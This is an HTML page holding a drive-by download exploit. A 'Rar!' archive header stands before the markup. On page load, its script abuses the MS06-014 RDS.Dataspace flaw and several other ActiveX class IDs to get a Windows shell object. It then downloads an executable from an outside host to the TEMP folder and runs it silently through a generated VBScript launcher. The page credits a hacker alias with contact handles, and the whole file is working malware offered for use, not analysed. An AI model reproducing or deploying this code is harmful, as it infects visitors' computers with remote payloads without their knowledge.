<html>
<head>
<title>By:HackerSZC QQ:83883886 Msn:hackerszc@126.com</title>
</head><body>
Rar!     
<noscript> 
<iframe src=*></iframe> 
</noscript>
<script language="javaScript">
RiSing="http://www.v1ad.com/v1ad.exe"
RiSing1="ms.exe"
RiSing2="ms.vbs"
MS06014="BD96C556-65A3-11D0-983A-00C04FC29E36"
function Log(QQ83883886)
{
 var log=document.createElement('p');
     log.innerHTML=QQ83883886;
}
function CreateO(o,n)
{
 var r=null;
 try
   {
    eval('r=o.CreateObject(n)')
   }
 catch(e)
   {}
 if (!r)
   {
    try
     {
      eval('r=o.CreateObject(n,"")')
     }
    catch(e)
     {}
   }
 if(!r)
   {
    try
      {
       eval('r=o.CreateObject(n,"","")')
      }
    catch(e)
     {}
   }
 if (!r)
  {
   try
     {
      eval('r=o.GetObject("",n)')
     }
   catch(e)
     {}
  }
 if (!r)
   {
    try
      {
       eval('r=o.GetObject(n,"")')
      }
    catch(e)
      {}
   }
 if (!r)
   {
    try
      {
       eval('r=o.GetObject(n)')
      }
    catch(e)
      {}
   }
 return(r);
}
function Go(a)
{
 Log('');
 HackerSZC="WScript.S";
 NiuBWangMa=HackerSZC;
 var s=CreateO(a,NiuBWangMa+"hell");
 var o=CreateO(a,"ADODB.Stream");
 var ip=CreateO(a,"ADODB.Stream");
 var e=s.Environment("Process");
 Log('');
 var url=RiSing;
 var LaJi=e.Item("TEMP")+"\\"+RiSing1;
 var LeSe=e.Item("TEMP")+"\\"+RiSing2;
 var vip=null;
 var QQ88088878;
 QQ88088878="Set Shell = CreateObject(\"Wscript.Shell\")";
 QQ88088878=QQ88088878+"\n"+"Shell.Run(\""+LaJi+"\")";
 QQ88088878=QQ88088878+"\n"+"set Shell=Nothing";
 ip.Mode=3;
 ip.Open();
 ip.Charset = "GB2312";
 ip.Position = ip.Size;
 ip.WriteText=QQ88088878;
 ip.SaveToFile(LeSe,2);
 try
   {
    vip=new XMLHttpRequest();
   }
 catch(e)
  {
   try
     {
      vip=new ActiveXObject("Microsoft.XMLHTTP");
     }
   catch(e)
     {
      vip=new ActiveXObject("MSXML2.ServerXMLHTTP");
     }
  }
 if (!vip) return(0);
 Log('');
 vip.open("GET",url,false);
 vip.send(null);
 QQ88088878=
 vip.ReSponSEBOdY;
 Log('');
 o.Type=1;
 o.Mode=3;
 o.Open();
 o.Write(QQ88088878);
 o.SaveToFile(LaJi,2);
 Log('');
 s.Run(LeSe,0);
}
function Exploit()
{
 var i=0;
 var tt=new Array('{MS06014}','{BD96C556-65A3-11D0-983A-00C04FC29E36}','{AB9BCEDD-EC7E-47E1-9322-D4A210617116}','{0006F033-0000-0000-C000-000000000046}','{0006F03A-0000-0000-C000-000000000046}','{6e32070a-766d-4ee6-879c-c1fa91d2fc3}','{6414512B-B978-451D-A0D8-FCFDF33E833C}','{7F5B7F63-F06F-4331-8A26-339E03C0AE3D}','{06723E09-F4C2-43c8-8358-09FCD1DB0766}','{639F725F-1B2D-4831-A9FD-874847682010}','{BA018599-1DB3-44f9-83B4-461454C84BF8}','{D0C07D56-7C69-43F1-B4A0-25F5A11FAB19}','{E8CCCDDF-CA28-496b-B050-6C07C962476B}',null);
while (true)
   { t=tt[i];
     if (t==null)
       {
        return(0);
       }
     var a=null;
     if (t.substring(0,1)=='{')
       {
        try{
           a=document.createElement("object");
           a.setAttribute("classid","clsid:"+t.substring(1,t.length-1));
          }
        catch(e)
          {}
       }
     else
       {
        try{
           a=new ActiveXObject(t);
          }
        catch(e)
          {}
       }
     if (a)
       {
        try
          {
           var b=CreateO(a,"WScript.Shell");
           if (b)
             {
              Log('');
              Go(a);
              return(0);
             }
          }
        catch(e)
          {}
       }
     i++;
    }
  Log('');
}
 Exploit()

</script>
<script type="text/jscript">function init() { document.write("");}window.onload = init;</script>
</body>
</html>
